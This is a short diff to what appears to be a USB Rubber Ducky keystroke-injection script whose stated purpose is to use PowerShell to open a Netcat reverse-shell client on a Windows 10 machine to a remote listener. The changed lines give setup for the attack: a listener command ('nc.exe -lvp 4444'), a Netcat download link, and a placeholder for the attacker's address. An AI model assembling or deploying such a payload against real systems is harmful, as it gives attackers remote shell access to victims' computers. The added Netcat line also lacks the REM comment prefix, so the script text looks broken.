@@ -4,9 +4,10 @@ REM Description: Uses Powershell to start a Netcat client that stays open until 
 REM Target: Windows 10
 
 REM *REQUIREMENTS*
-REM start a netcat listener on server machine using port 4444 (eg. nc -lvp 4444).
+REM start a netcat listener on server machine using port 4444 (example command for netcat > nc.exe -lvp 4444).
 
 REM *SETUP*
+NETCAT FOR WINDOWS - https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip
 REM replace YOUR_IP_OR_DOMAIN_HERE with ncat server address and PORT_NUMBER.
 
 REM some setup for dukie script.
